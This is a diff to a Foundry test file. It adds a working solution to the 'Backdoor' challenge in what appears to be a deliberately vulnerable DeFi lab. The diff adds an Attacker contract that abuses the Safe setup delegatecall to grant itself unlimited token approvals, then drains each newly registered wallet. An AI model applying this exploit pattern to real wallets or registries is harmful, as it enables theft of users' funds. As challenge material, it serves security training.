@@ -3,10 +3,67 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {Safe} from "safe-smart-account/contracts/Safe.sol";
+import {SafeProxyFactory} from "safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+// import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+// import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+
+contract BackdoorModule {
+    function approve(address token, address spender) external {
+        IERC20(token).approve(spender, type(uint256).max);
+    }
+}
+
+
+contract Attacker{
+
+    
+    function attack(
+        address[] memory users,
+        Safe singletonCopy,
+        SafeProxyFactory walletFactory,
+        WalletRegistry walletRegistry,
+        DamnValuableToken token,
+        address recovery
+    ) external {
+        BackdoorModule backdoorModule = new BackdoorModule();
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(backdoorModule),
+                abi.encodeWithSelector(
+                    BackdoorModule.approve.selector,
+                    address(token),
+                    address(this)
+                ),
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                i,
+                IProxyCreationCallback(address(walletRegistry))
+            );
+
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
+    }
+}
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -34,7 +91,7 @@ contract BackdoorChallenge is Test {
     function setUp() public {
         startHoax(deployer);
         // Deploy Safe copy and factory
-        singletonCopy = new Safe();
+        singletonCopy = new Safe(); 
         walletFactory = new SafeProxyFactory();
 
         // Deploy reward token
@@ -70,7 +127,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker();
+        attacker.attack(users, singletonCopy, walletFactory, walletRegistry, token, recovery);
     }
 
     /**
